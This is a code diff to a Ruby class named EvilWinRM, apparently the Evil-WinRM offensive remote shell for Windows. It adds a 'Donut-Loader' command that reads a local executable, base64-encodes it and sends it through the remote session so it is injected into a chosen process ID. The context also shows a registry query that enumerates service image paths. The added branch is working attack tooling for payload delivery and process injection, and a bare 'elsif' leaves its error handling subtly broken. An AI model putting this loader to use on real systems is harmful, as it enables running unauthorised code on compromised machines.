@@ -388,6 +388,27 @@ class EvilWinRM
                             self.print_message("Check file names", TYPE_ERROR)
                         end
 
+                    elsif command.start_with?('Donut-Loader') then
+                        begin
+                            donut_Loader = command.tokenize
+                            command = ""
+                            pid = donut_Loader[2]
+                            load_executable = donut_Loader[4]
+                            load_executable = File.binread(load_executable)
+                            load_executable = Base64.strict_encode64(load_executable)
+
+                            if !donut_Loader[4].to_s.empty?
+                                print("Sending payload...")
+                                output = shell.run("Donut-Loader -process_id " + pid + " -donutfile " + load_executable)
+                            elsif
+                                self.print_message("Check parameters")
+                            end
+                            print(output.output)
+
+                        rescue
+                            self.print_message("Check file names", TYPE_ERROR)
+                        end
+
                     elsif command.start_with?('services') then
                         command = ""
                         output = shell.run('Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath | fl')
